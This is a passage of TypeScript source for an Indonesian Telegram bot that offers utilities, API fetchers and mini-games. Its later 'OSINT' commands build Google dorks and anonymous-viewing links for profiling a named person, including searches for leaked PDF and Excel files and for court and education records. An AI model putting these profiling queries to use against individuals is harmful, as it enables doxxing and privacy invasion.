                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<code>${result}</code>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, {parse_mode: 'HTML'}); 
      } catch { ctx.reply("❌ Invalid base64"); }
    });

    bot.command('hash', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /hash [text]");
      const md5 = crypto.createHash('md5').update(args).digest('hex');
      const sha256 = crypto.createHash('sha256').update(args).digest('hex');
      const reply = `<b>🔐 MULTI-HASH GENERATOR</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TEXT:</b> <code>${args}</code>\n\n` +
                    `├ <b>MD5:</b>\n└ <code>${md5}</code>\n\n` +
                    `├ <b>SHA256:</b>\n└ <code>${sha256}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('sha256', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /sha256 [text]");
      ctx.reply(`🔐 SHA256:\n<code>${crypto.createHash('sha256').update(args).digest('hex')}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('uuid', (ctx) => {
      const reply = `<b>🆔 UUID GEN (v4)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<code>${crypto.randomUUID()}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('flip', (ctx) => {
      ctx.reply(`🪙 Hasil lempar koin: <b>${Math.random() > 0.5 ? 'Kepala (Heads)' : 'Ekor (Tails)'}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('roll', (ctx) => {
      const num = Math.floor(Math.random() * 6) + 1;
      ctx.reply(`🎲 Hasil dadu: <b>${num}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('weather', async (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join('');
      if(!args) return ctx.reply("Format: /weather [kota]");
      try {
        const res = await fetch(`https://wttr.in/${encodeURIComponent(args)}?format=3`);
        const text = await res.text();
        const reply = `<b>⛅ WEATHER FORECAST</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<pre>${text}</pre>` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Gagal mendapat info cuaca."); }
    });

    bot.command('crypto_price', async (ctx) => {
       const args = ctx.message.text.split(' ')[1] || 'bitcoin';
       try {
         const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${args.toLowerCase()}&vs_currencies=usd,idr`);
         const data = await res.json();
         if(data[args.toLowerCase()]) {
            const reply = `<b>🪙 MARKET PRICE: ${args.toUpperCase()}</b>\n` +
                          `━━━━━━━━━━━━━━━━━━━━\n` +
                          `├ 💵 <b>USD:</b> $${data[args.toLowerCase()].usd}\n` +
                          `└ 🇮🇩 <b>IDR:</b> Rp${data[args.toLowerCase()].idr.toLocaleString('id-ID')}\n` +
                          `━━━━━━━━━━━━━━━━━━━━`;
            ctx.reply(reply, {parse_mode: 'HTML'});
         } else { ctx.reply("❌ Koin tidak ditemukan."); }
       } catch { ctx.reply("❌ Error fetch market."); }
    });

    bot.command('meme', async (ctx) => {
      try {
        const res = await fetch('https://meme-api.com/gimme');
        const data = await res.json();
        ctx.replyWithPhoto(data.url, { caption: data.title });
      } catch { ctx.reply("❌ Error get meme."); }
    });

    bot.command('joke', async (ctx) => {
      try {
        const res = await fetch('https://official-joke-api.appspot.com/random_joke');
        const data = await res.json();
        ctx.reply(`🤣 <b>${data.setup}</b>\n\n<i>${data.punchline}</i>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get joke."); }
    });

    bot.command('quote', async (ctx) => {
      try {
        const res = await fetch('https://dummyjson.com/quotes/random');
        const data = await res.json();
        ctx.reply(`💭 <i>"${data.quote}"</i>\n- <b>${data.author}</b>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get quote."); }
    });

    bot.command('fact', async (ctx) => {
      try {
        const res = await fetch('https://uselessfacts.jsph.pl/random.json?language=en');
        const data = await res.json();
        ctx.reply(`🧠 <b>Faktanya:</b>\n${data.text}`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get fact."); }
    });

    bot.command('cat', async (ctx) => {
      try {
        const res = await fetch('https://api.thecatapi.com/v1/images/search');
        const data = await res.json();
        ctx.replyWithPhoto(data[0].url);
      } catch { ctx.reply("❌ Error get cat."); }
    });

    bot.command('dog', async (ctx) => {
      try {
        const res = await fetch('https://dog.ceo/api/breeds/image/random');
        const data = await res.json();
        ctx.replyWithPhoto(data.message);
      } catch { ctx.reply("❌ Error get dog."); }
    });

    const downloadSong = async (ctx: any) => {
      return ctx.reply("🚧 <b>Fitur musik (/play & /lagu) sedang dalam pemeliharaan (maintenance). Mohon tunggu kabar selanjutnya.</b>", { parse_mode: 'HTML' });
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if (!args) return ctx.reply("🎵 Gunakan format: /lagu [judul] atau /play [judul]");
      
      const waitMsg = await ctx.reply("⏳ <i>Mencari lagu di database (YouTube)...</i>", { parse_mode: 'HTML' });
      try {
        const results = await yts(args);
        
        if (!results || results.videos.length === 0) {
           return ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, "❌ ʟᴀɢᴜ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ.");
        }
        
        const video = results.videos[0];
        
        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, `⏳ <i>ᴍᴇɴɢᴜɴᴅᴜʜ ᴀᴜᴅɪᴏ: ${video.title}...\n(ᴘʀᴏꜱᴇꜱ ʙʏᴘᴀꜱꜱ ᴋᴇᴄᴇᴘᴀᴛᴀɴ ᴛɪɴɢɢɪ ꜱᴇᴅᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ...)</i>`, { parse_mode: 'HTML' });
        
        try {
          play.setToken({ useragent: ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"] });
          const info = await ytdl.getInfo(video.url, {
            requestOptions: {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
              }
            }
          });
          const stream = ytdl.downloadFromInfo(info, { filter: 'audioonly', quality: 'highestaudio' });
          
          await ctx.replyWithAudio(
            { source: stream, filename: video.title + '.mp3' },
            { caption: `🎵 <b>${video.title}</b>\n👤 <b>Author:</b> ${video.author.name}\n☁️ <b>Source:</b> YouTube`, parse_mode: 'HTML' }
          );
          
          ctx.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => {});
        } catch (downloadErr: any) {
          throw new Error("Gagal mengambil stream audio via play-dl: " + downloadErr?.message);
        }
      } catch (err: any) {
        console.error("Lagu err:", err);
        ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, `❌ Gagal mengunduh lagu: ${err?.message || 'Error internal'}`);
      }
    };

    bot.command('lagu', downloadSong);
    bot.command('play', downloadSong);

    bot.command('hentai', (ctx) => {
      ctx.reply("🔞 <b>ʜᴇɴᴛᴀɪ ᴍᴏᴅᴜʟᴇ (ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ)</b>\n━━━━━━━━━━━━━━━━━━━━\n\nꜱᴏʀʀʏ, ꜰɪᴛᴜʀ ᴜɴᴅᴜʜ ᴠɪᴅᴇᴏ ꜱᴇᴅᴀɴɢ ᴅɪᴘᴇʀʙᴀɪᴋɪ.\nᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ ᴘᴀᴅᴀ ᴜᴘᴅᴀᴛᴇ ʙᴇʀɪᴋᴜᴛɴʏᴀ.", { parse_mode: 'HTML' });
    });

    // --- 20+ MINI GAMES ---
    bot.command('suit', (ctx) => {
      const choices = ['batu', 'gunting', 'kertas'];
      const args = ctx.message.text.split(' ')[1]?.toLowerCase();
      if (!args || !choices.includes(args)) return ctx.reply("Format: /suit [batu/gunting/kertas]");
      const botChoice = choices[Math.floor(Math.random() * choices.length)];
      let result = 'KITA SERI! 😑';
      if (
        (args === 'batu' && botChoice === 'gunting') ||
        (args === 'gunting' && botChoice === 'kertas') ||
        (args === 'kertas' && botChoice === 'batu')
      ) { result = 'KAMU MENANG! 🎉'; }
      else if (args !== botChoice) { result = 'KAMU KALAH! 🤡'; }
      ctx.reply(`Kamu: ${args.toUpperCase()}\nBot: ${botChoice.toUpperCase()}\n\n${result}`);
    });

    bot.command('math', (ctx) => {
      const ops = ['+', '-', '*'];
      const op = ops[Math.floor(Math.random() * ops.length)];
      const a = Math.floor(Math.random() * 50) + 1;
      const b = Math.floor(Math.random() * 20) + 1;
      const ans = op === '+' ? a+b : op === '-' ? a-b : a*b;
      ctx.reply(`🧮 <b>QUICK MATHS</b>\nBerapa hasil dari: <b>${a} ${op} ${b} = ?</b>\n\n<tg-spoiler>Jawaban: ${ans}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('dadu', (ctx) => {
      const num = Math.floor(Math.random() * 6) + 1;
      ctx.reply(`🎲 Kamu melempar dadu dan mendapat angka: <b>${num}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('coinflip', (ctx) => {
      const res = Math.random() > 0.5 ? 'HEADS (Angka)' : 'TAILS (Gambar)';
      ctx.reply(`🪙 Koin dilempar dan hasilnya: <b>${res}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('susunkata', (ctx) => {
      const words = ['hacker', 'phishing', 'malware', 'firewall', 'server', 'database', 'payload', 'system', 'network', 'cyber'];
      const word = words[Math.floor(Math.random() * words.length)];
      const scrambled = word.split('').sort(() => 0.5 - Math.random()).join('');
      ctx.reply(`🔡 <b>SUSUN KATA</b>\nCoba susun huruf ini menjadi istilah IT:\n<b>${scrambled.toUpperCase()}</b>\n\n<tg-spoiler>Jawaban: ${word.toUpperCase()}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakangka', (ctx) => {
      const a = Math.floor(Math.random() * 10) + 1;
      ctx.reply(`🔢 <b>TEBAK ANGKA</b>\nAku sudah memilih angka dari 1 - 10.\n\n<tg-spoiler>Angka itu adalah: ${a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('khodam', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Kamu';
      const k = ['Macan Putih', 'Naga Sakti', 'Kuntilanak Merah', 'Kucing Oren', 'Tuyul Racing', 'Siluman Ular', 'Bebek Ngesot', 'Kosong (Tidak Ada)', 'Kulkas 2 Pintu', 'Spion Motor'];
      const res = k[Math.floor(Math.random() * k.length)];
      ctx.reply(`👻 <b>CEK KHODAM</b>\nNama: ${nama}\nKhodam kamu: <b>${res}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('ramal', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Kamu';
      const r = ['Akan kaya raya tahun depan!', 'Akan menemukan jodoh secepatnya!', 'Akan kesandung batu besok', 'Harus lebih banyak minum air putih', 'Sedang dirindukan seseorang', 'Akan mendapat rezeki nomplok', 'Akan menangis bahagia hari ini'];
      const res = r[Math.floor(Math.random() * r.length)];
      ctx.reply(`🔮 <b>RAMALAN HARI INI</b>\nNama: ${nama}\nRamalan: <i>${res}</i>`, {parse_mode: 'HTML'});
    });

    bot.command('jodoh', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 3) return ctx.reply("Format: /jodoh [Nama1] [Nama2]");
      const pct = Math.floor(Math.random() * 101);
      ctx.reply(`💘 <b>KALKULATOR JODOH</b>\n${args[1]} 💞 ${args[2]}\n\nTingkat Kecocokan: <b>${pct}%</b>\n${pct > 80 ? 'Wow! Kalian sangat serasi!' : pct > 40 ? 'Hmm, boleh juga.' : 'Sebaiknya cari yang lain...'}`, {parse_mode: 'HTML'});
    });

    bot.command('kartu', (ctx) => {
      const suits = ['♠️ Terop', '♥️ Hati', '♣️ Keriting', '♦️ Wajik'];
      const values = ['As', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'Jack', 'Queen', 'King'];
      const a = suits[Math.floor(Math.random() * suits.length)];
      const b = values[Math.floor(Math.random() * values.length)];
      ctx.reply(`🃏 Kamu menarik kartu: <b>${b} ${a}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('roulette', (ctx) => {
      const bullet = Math.floor(Math.random() * 6);
      if (bullet === 0) return ctx.reply("🔫 💥 DORRR!!! Kamu tertembak (Russian Roulette)!");
      ctx.reply("🔫 <i>Click...</i> Selamat, peluru kosong. Kamu selamat.", {parse_mode: 'HTML'});
    });

    bot.command('werewolf', (ctx) => {
      const roles = [
        { r: '🐺 Werewolf', d: 'Tujuanmu: Habisi villager tanpa ketahuan. Berbohonglah dengan baik.' },
        { r: '🧙‍♀️ Seer', d: 'Tujuanmu: Terawang 1 orang setiap malam untuk mencari Werewolf.' },
        { r: '🛡️ Bodyguard', d: 'Tujuanmu: Lindungi 1 orang setiap malam dari gigitan Werewolf.' },
        { r: '🧑‍🌾 Villager', d: 'Tujuanmu: Cari tahu siapa Werewolf di siang hari dan gantung mereka.' },
        { r: '🃏 Fool', d: 'Tujuanmu: Bertingkah mencurigakan agar digantung oleh Villager (kamu menang jika digantung).' },
        { r: '🏹 Hunter', d: 'Tujuanmu: Jika kamu mati, kamu bisa membawa seseorang ikut mati bersamamu.' }
      ];
      const r = roles[Math.floor(Math.random() * roles.length)];
      
      const devEvents = [
        "Desa sedang tegang. Seorang penduduk ditemukan tewas tercabik-cabik.",
        "Malam sangat hening, tidak ada lolongan.",
        "Warga desa mulai saling curiga di balai desa.",
        "Seseorang tertangkap basah keluar rumah saat tengah malam."
      ];
      const sim = devEvents[Math.floor(Math.random() * devEvents.length)];

      const msg = `🌕 <b>WEREWOLF ROLE SPREAD</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Kamu terbangun di desa misterius...\n\n` +
                  `🎭 <b>ROLE KAMU:</b> ${r.r}\n` +
                  `📜 <b>MISI:</b> <i>${r.d}</i>\n\n` +
                  `🌑 <b>SITUASI DESA:</b>\n` +
                  `<i>"${sim}"</i>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n`;
      ctx.reply(msg, {parse_mode: 'HTML'});
    });

    bot.command('8ball', (ctx) => {
      const q = ctx.message.text.split(' ').slice(1).join(' ');
      if(!q) return ctx.reply("Format: /8ball [pertanyaan]");
      const answers = [
        { type: '🟢 Positif', text: ['Sangat mungkin terjadi.', 'Tentu saja.', 'Alam semesta mendukungmu.'] },
        { type: '🟡 Ragu-ragu', text: ['Awan masih gelap, coba lagi nanti.', 'Peluangnya 50/50.', 'Tergantung usahamu mulai sekarang.'] },
        { type: '🔴 Negatif', text: ['Jangan terlalu berharap.', 'Jauh panggang dari api.', 'Sangat mustahil.'] }
      ];
      const category = answers[Math.floor(Math.random() * answers.length)];
      const res = category.text[Math.floor(Math.random() * category.text.length)];
      
      ctx.reply(`🎱 <b>MAGIC 8-BALL ORACLE</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `❓ <b>Pertanyaan:</b> <i>${q}</i>\n` +
                `🔮 <b>Aura:</b> ${category.type}\n` +
                `💬 <b>Jawaban:</b> <b>${res}</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML'});
    });

    bot.command('tarot', (ctx) => {
      const cards = [
        { c: 'The Fool', m: 'Awal baru, spontanitas, keberanian mengambil risiko.' },
        { c: 'The Magician', m: 'Kekuatan memanifestasikan keinginan, skill, fokus.' },
        { c: 'The High Priestess', m: 'Intuisi mendalam, rahasia tersembunyi, spiritualitas.' },
        { c: 'The Empress', m: 'Kelimpahan, kreativitas, keibuan, alam.' },
        { c: 'The Emperor', m: 'Struktur, fondasi kuat, otoritas, kepemimpinan.' },
        { c: 'The Lovers', m: 'Pilihan, harmoni, hubungan, nilai-nilai sejalan.' },
        { c: 'The Chariot', m: 'Kemauan keras, kontrol, mengatasi rintangan.' },
        { c: 'Death', m: 'Perubahan radikal, akhir dari sebuah fase, transformasi.' },
        { c: 'The Tower', m: 'Kehancuran tiba-tiba, kebenaran terungkap bejat, kekacauan buta.' },
        { c: 'The Star', m: 'Harapan setelah badai, penyembuhan, inspirasi murni.' },
        { c: 'The Moon', m: 'Ilusi, ketakutan bawah sadar, kompleksitas batin.' },
        { c: 'The Sun', m: 'Sukses, kebahagiaan, pencapaian puncak, kejelasan.' }
      ];
      
      // Select 3 random unique cards
      const shuffled = cards.sort(() => 0.5 - Math.random());
      const selected = shuffled.slice(0, 3);

      const msg = `🎴 <b>TAROT: THREE CARDS SPREAD</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🕰️ <b>MASA LALU:</b> ${selected[0].c}\n` +
                  `<i>${selected[0].m}</i>\n\n` +
                  `🌍 <b>MASA KINI:</b> ${selected[1].c}\n` +
                  `<i>${selected[1].m}</i>\n\n` +
                  `🔮 <b>MASA DEPAN:</b> ${selected[2].c}\n` +
                  `<i>${selected[2].m}</i>\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;

      ctx.reply(msg, {parse_mode: 'HTML'});
    });

    bot.command('doa', (ctx) => {
      const qs = [
        { title: 'Doa Memohon Kemudahan', ar: 'رَبِّ اشْرَحْ لِي صَدْرِي وَيَسِّرْ لِي أَمْرِي', id: 'Ya Tuhanku, lapangkanlah untukku dadaku, dan mudahkanlah untukku urusanku.' },
        { title: 'Doa Kebaikan Dunia Akhirat', ar: 'رَبَّنَا آتِنَا فِي الدُّنْيَا حَسَنَةً وَفِي الآخِرَةِ حَسَنَةً وَقِنَا عَذَابَ النَّارِ', id: 'Ya Tuhan kami, berikan kami kebaikan di dunia dan kebaikan di akhirat, dan lindungilah kami dari siksa neraka.' },
        { title: 'Doa Memohon Kesembuhan', ar: 'اللَّهُمَّ رَبَّ النَّاسِ أَذْهِبِ الْبَأْسَ اشْفِ أَنْتَ الشَّافِي', id: 'Ya Allah, Tuhan manusia, hilangkanlah penyakit, sembuhkanlah, Engkau Maha Penyembuh.' }
      ];
      const q = qs[Math.floor(Math.random() * qs.length)];
      ctx.reply(`🤲 <b>DAILY PRAYER / DOA</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>${q.title}</b>\n\n<code>${q.ar}</code>\n\n<i>"${q.id}"</i>\n━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML'});
    });

    bot.command('tod', (ctx) => {
      const t = ['Beritahu rahasia terbesarmu!', 'Kapan terakhir kali menangis?', 'Siapa crush kamu saat ini?', 'Pernah ngompol di celana?', 'Hal terburuk apa yang pernah kamu lakukan ke teman?'];
      const d = ['Kirim foto jelek kamu sekarang!', 'Chat mantan kamu bilang rindu!', 'Ganti PP wa sama gambar monyet seharian!', 'Kirim VN nyanyi balonku!', 'Post story nyanyi lagu anak anak!'];
      const isTruth = Math.random() > 0.5;
      const res = isTruth ? `🔵 <b>TRUTH</b>\n${t[Math.floor(Math.random() * t.length)]}` : `🔴 <b>DARE</b>\n${d[Math.floor(Math.random() * d.length)]}`;
      ctx.reply(res, {parse_mode: 'HTML'});
    });

    bot.command('gombal', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Sayang';
      const g = [
        `${nama}, tau bedanya kamu sama modem? Modem connect ke internet, kamu connect ke hatiku.`, 
        `Sejak kenal ${nama}, aku lupa cara sedih.`, 
        `Pisa miring karena terpesona senyum ${nama}.`,
        `${nama}, cintaku ke kamu itu kayak Dorking. Semakin digali, semakin dalam.`
      ];
      ctx.reply(`💕 <b>GOMBALAN CYBER</b>\n<i>"${g[Math.floor(Math.random() * g.length)]}"</i>`, {parse_mode: 'HTML'});
    });

    bot.command('tebaknegara', (ctx) => {
      const t = [{c:'🇯🇵', a:'Jepang'}, {c:'🇮🇩', a:'Indonesia'}, {c:'🇺🇸', a:'Amerika'}, {c:'🇰🇷', a:'Korea'}, {c:'🇷🇺', a:'Rusia'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🌍 <b>TEBAK BENDERA</b>\nBendera apakah ini: ${items.c} ?\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakkata', (ctx) => {
      const t = [{q:'Selalu di depan, tak terlihat?', a:'Masa Depan'}, {q:'Bisa dipegang tak bisa dilempar?', a:'Janji'}, {q:'Punya gigi tak bisa menggigit?', a:'Sisir'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🤔 <b>TEBAK KATA</b>\n${items.q}\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakhewan', (ctx) => {
      const t = [{q:'Hidup di air & darat, melompat.', a:'Katak'}, {q:'Belalai panjang.', a:'Gajah'}, {q:'Leher panjang, makan daun atas.', a:'Jerapah'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🐾 <b>TEBAK HEWAN</b>\n${items.q}\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('morse', (ctx) => {
      const text = ctx.message.text.split(' ').slice(1).join(' ').toUpperCase();
      if(!text) return ctx.reply("Format: /morse [text]");
      const morseCode: Record<string, string> = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '1': '.----', '2': '..---', '3': '...--',
        '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
        '9': '----.', '0': '-----', ' ': '/'
      };
      const resData = text.split('').map(c => morseCode[c] || c).join(' ');
      const reply = `<b>📡 MORSE ENCODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<pre>${resData}</pre>` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('ig', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /ig [username]");
      const user = args[1].replace('@', '');
      const reply = `<b>📸 INSTAGRAM OSINT</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 <b>Target:</b> @${user}\n\n` +
                    `🔗 <b>Direct Link:</b> <a href="https://www.instagram.com/${user}/">instagram.com/${user}</a>\n` +
                    `🔍 <b>Picuki (No-Login View):</b> <a href="https://www.picuki.com/profile/${user}">View on Picuki</a>\n` +
                    `📡 <b>Story Saver:</b> <a href="https://iganony.io/profile/${user}">View Stories Anonymously</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>⚠️ Instagram memblokir scraping langsung. Gunakan link di atas untuk investigasi manual (OPSEC aman).</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('tiktok', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /tiktok [username]");
      const user = args[1].replace('@', '');
      const reply = `<b>🎵 TIKTOK OSINT</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 <b>Target:</b> @${user}\n\n` +
                    `🔗 <b>Direct Link:</b> <a href="https://www.tiktok.com/@${user}">tiktok.com/@${user}</a>\n` +
                    `🔍 <b>Urlebird (No-Login View):</b> <a href="https://urlebird.com/user/${user}/">View on Urlebird</a>\n` +
                    `📡 <b>TokCount (Live Stats):</b> <a href="https://tokcount.com/?user=${user}">Live API Count</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>⚠️ Gunakan Urlebird untuk melihat video TikTok secara anonim tanpa tercatat di Analytics target.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('github', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /github [username]");
      const user = args[1].replace('@', '');
      
      try {
        const msg = await ctx.reply(`<i>🔄 Menarik data dari GitHub API untuk <b>${user}</b>...</i>`, { parse_mode: 'HTML' });
        const res = await fetch(`https://api.github.com/users/${user}`);
        if(res.status === 404) return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, "❌ User GitHub tidak ditemukan.");
        
        const data = await res.json();
        const reply = `<b>🐙 GITHUB OSINT DATA</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `👤 <b>Name:</b> ${data.name || 'N/A'}\n` +
                      `🏷️ <b>Username:</b> @${data.login}\n` +
                      `🏢 <b>Company:</b> ${data.company || '-'}\n` +
                      `📍 <b>Location:</b> ${data.location || '-'}\n` +
                      `📧 <b>Email:</b> ${data.email || 'Private/Hidden'}\n` +
                      `🐦 <b>Twitter:</b> ${data.twitter_username ? '@'+data.twitter_username : '-'}\n\n` +
                      `📊 <b>STATISTIK:</b>\n` +
                      `├ Repos: ${data.public_repos}\n` +
                      `├ Gists: ${data.public_gists}\n` +
                      `├ Followers: ${data.followers}\n` +
                      `└ Following: ${data.following}\n\n` +
                      `📅 <b>Dibuat:</b> ${new Date(data.created_at).toISOString().split('T')[0]}\n` +
                      `🔗 <b>Link:</b> <a href="${data.html_url}">${data.html_url}</a>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
      } catch (err) {
        ctx.reply("❌ Gagal menarik data GitHub.");
      }
    });

    bot.command('nama', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if (!args) return ctx.reply("Format: /nama [Nama Lengkap]");
      const q = encodeURIComponent(`"${args}"`);
      const q2 = encodeURIComponent(`"${args}" site:linkedin.com/in OR site:id.linkedin.com/in`);
      const q3 = encodeURIComponent(`"${args}" filetype:pdf OR filetype:xls OR filetype:xlsx`);
      
      const reply = `<b>👤 PEOPLE OSINT (PROFILER NAMA)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TARGET ENTITAS:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🌐 REKAM JEJAK DIGITAL UMUM:</b>\n` +
                    `├ <a href="https://www.google.com/search?q=${q}">Pemindaian Indeks Global Google (Dorking Tanda Kutip)</a>\n` +
                    `└ <a href="https://www.google.com/search?q=${q3}">Skrining Kebocoran Data Bantuan/Absensi Organisasi (PDF/Excel)</a>\n\n` +
                    `<b>[2] 💼 KARIER & NETWORKING PROFESIONAL:</b>\n` +
                    `└ <a href="https://www.google.com/search?q=${q2}">Investigasi CV & Pengalaman Kerja di LinkedIn</a>\n\n` +
                    `<b>[3] 🏛️ HISTORIS HUKUM & AKADEMIK:</b>\n` +
                    `├ <a href="https://www.google.com/search?q=site:pddikti.kemdikbud.go.id+${q}">Tracer PD-Dikti (Rekam Kuliah & Drop Out)</a>\n` +
                    `└ <a href="https://www.google.com/search?q=site:putusan3.mahkamahagung.go.id+${q}">Pemeriksaan Keterlibatan Perkara Hukum (Direktori MA)</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>⚠️ Profiling Open Source berdasarkan kecocokan nama, lakukan filter lanjutan untuk menyaring entitas dengan nama pasaran.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('bea_cukai', (ctx) => {
      const args = ctx.message.text.substring(11).trim();
      if (!args) return ctx.reply("⚠️ Format: /bea_cukai [Nomor Resi / AWB / IMEI]");
      const q1 = encodeURIComponent(`"${args}" site:beacukai.go.id`);
      const q2 = encodeURIComponent(`"Barang Kiriman" OR "IMEI" "${args}" filetype:pdf`);
      const reply = `<b>🚢 KEPABEANAN & CUKAI MAPPING (ENTERPRISE)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📦 <b>TARGET (RESI/IMEI):</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ TRACE DB DIREKTORAT JENDRAL BEA CUKAI:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Penelusuran Nomor Consignment / Penetapan Pabean</a>\n\n` +
                    `<b>[2] 🚨 INVESTIGASI BARANG SITAAN & LELANG BMN:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Scan Daftar Barang Tidak Dikuasai / Blacklist IMEI</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>Modul Intelijen Kepabeanan Ekspor/Impor Nasional.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('sivil', (ctx) => {
      const args = ctx.message.text.substring(7).trim();
      if (!args) return ctx.reply("⚠️ Format: /sivil [Nomor Ijazah/PIN]");
      const q1 = encodeURIComponent(`"${args}" site:ijazah.kemdikbud.go.id OR site:pddikti.kemdikbud.go.id`);
      const q2 = encodeURIComponent(`"${args}" "Ijazah" OR "Transkrip" site:ac.id filetype:pdf`);
